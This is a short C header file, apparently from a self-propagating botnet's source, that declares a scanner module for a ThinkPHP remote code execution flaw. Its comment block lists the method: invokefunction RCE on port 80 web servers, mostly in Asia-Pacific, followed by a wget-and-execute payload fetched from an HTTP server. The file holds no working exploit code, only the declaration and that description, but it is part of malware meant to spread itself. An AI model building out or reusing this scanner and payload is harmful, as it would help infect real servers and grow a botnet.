#ifndef _THINKPHP_H
#define _THINKPHP_H

/* ============================================================================
 * THINKPHP SCANNER - Web Framework RCE (Port 80)
 * ============================================================================
 * Exploit: ThinkPHP framework RCE via invokefunction
 * Targets: Web servers running ThinkPHP (primarily Asia-Pacific)
 * Payload: wget + execute from HTTP server
 * ============================================================================ */

#include "includes.h"

#ifdef SELFREP
void thinkphp_scanner_init(void);
#endif

#endif
